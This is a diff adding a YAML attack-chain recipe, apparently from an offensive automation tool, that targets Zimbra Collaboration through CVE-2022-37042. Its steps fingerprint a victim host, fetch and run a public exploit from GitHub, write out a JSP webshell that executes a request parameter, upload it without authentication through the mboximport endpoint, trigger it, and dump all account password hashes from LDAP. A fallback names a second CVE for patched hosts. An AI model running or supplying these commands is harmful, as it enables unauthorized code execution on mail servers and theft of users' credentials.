@@ -1,0 +1,67 @@
+chain_id: zimbra_cve_2022_37042
+title: "Zimbra Collaboration — CVE-2022-37042 unauth file read & RCE via mboximport"
+severity: CRITICAL
+tags: [web, zimbra, cve-2022-37042, auth-bypass, file-read, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2022-37042" }
+    - { banner_pattern: "(?i)zimbra|zcs" }
+    - { product_pattern: "(?i)zimbra" }
+    - { path_pattern: "(?i)/service/extension/(backup/mboximport|clientUploader)|/zimbra/" }
+
+description: |
+  Zimbra Collaboration Suite 8.8.15 / 9.0.0 < patch-26: the
+  `/service/extension/backup/mboximport` endpoint accepts a multipart
+  upload as the `zimbra` user with no auth (CVE-2022-37042 chained
+  with the older auth-bypass CVE-2022-27925). Drop a JSP webshell
+  into the public directory → unauth RCE. CISA-flagged 2022, used in
+  Iranian state-actor mailbox-stealing campaigns.
+
+steps:
+  - id: 1
+    title: "Confirm Zimbra is exposed"
+    command: |
+      curl -sk -i "https://$VICTIMA/" | grep -i 'zimbra'
+      curl -sk -I "https://$VICTIMA/service/extension/backup/mboximport"
+
+  - id: 2
+    title: "Run the public PoC (uploads + verifies the webshell)"
+    command: |
+      git clone https://github.com/Mr-xn/CVE-2022-37042 /tmp/zimbra
+      python3 /tmp/zimbra/exp.py -t https://$VICTIMA -c id
+
+  - id: 3
+    title: "Manual — drop a JSP shell"
+    command: |
+      cat > shell.jsp <<'JSP'
+      <%@ page import="java.util.*,java.io.*"%>
+      <% Process p=Runtime.getRuntime().exec(request.getParameter("c"));
+         BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
+         String l; while((l=r.readLine())!=null) out.println(l); %>
+      JSP
+      tar -czf payload.tar.gz shell.jsp
+      curl -sk -X POST "https://$VICTIMA/service/extension/backup/mboximport?account-name=admin&ow=cmd&no-switch=1" \
+        -H 'Content-Type: application/x-tar' --data-binary @payload.tar.gz
+
+  - id: 4
+    title: "Trigger"
+    command: |
+      curl -sk "https://$VICTIMA/public/shell.jsp?c=id"
+
+  - id: 5
+    title: "Post — every Zimbra account's password hash is in LDAP"
+    command: |
+      # On the Zimbra host, as zimbra user:
+      su - zimbra -c "ldapsearch -x -H ldap://localhost -b '' -D 'uid=zimbra,cn=admins,cn=zimbra' -w \$(zmlocalconfig -s zimbra_ldap_password | awk '{print \$3}') '(objectClass=zimbraAccount)' userPassword"
+
+common_errors:
+  - error: "mboximport returns 401"
+    solution: |
+      Patched (≥ 9.0.0-P26 / 8.8.15-P33). Try CVE-2022-41352 (cpio
+      tarball escape) on the same install — same outcome, different
+      gadget.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2022-37042
+  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-228a
